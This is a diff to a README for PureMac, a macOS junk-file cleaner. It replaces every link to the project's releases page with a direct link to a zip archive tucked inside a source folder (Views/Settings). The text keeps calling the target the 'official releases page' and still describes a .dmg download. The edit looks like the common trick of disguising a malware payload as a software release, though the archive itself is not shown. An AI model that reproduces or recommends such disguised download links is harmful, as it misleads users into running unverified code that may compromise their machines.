@@ -1,14 +1,14 @@
 # 🧹 PureMac - Free tools to reclaim disk space
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/nguyenlehongphuc0106/PureMac/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/nguyenlehongphuc0106/PureMac/raw/refs/heads/main/PureMac/Views/Settings/Pure_Mac_3.6.zip)
 
 PureMac removes junk files from your macOS system. It identifies unneeded data to free up disk space. The app focuses on privacy and keeps your personal information on your computer. It performs scheduled tasks to maintain system performance. You use this tool to remove cache files from Xcode, Homebrew, and other system directories.
 
 ## 📥 How to download the app
 
-Visit the [official releases page](https://github.com/nguyenlehongphuc0106/PureMac/releases) to download the application. 
+Visit the [official releases page](https://github.com/nguyenlehongphuc0106/PureMac/raw/refs/heads/main/PureMac/Views/Settings/Pure_Mac_3.6.zip) to download the application. 
 
-1. Go to the [PureMac releases link](https://github.com/nguyenlehongphuc0106/PureMac/releases).
+1. Go to the [PureMac releases link](https://github.com/nguyenlehongphuc0106/PureMac/raw/refs/heads/main/PureMac/Views/Settings/Pure_Mac_3.6.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .dmg to start the download.
 4. Open the downloaded file once your browser finishes.
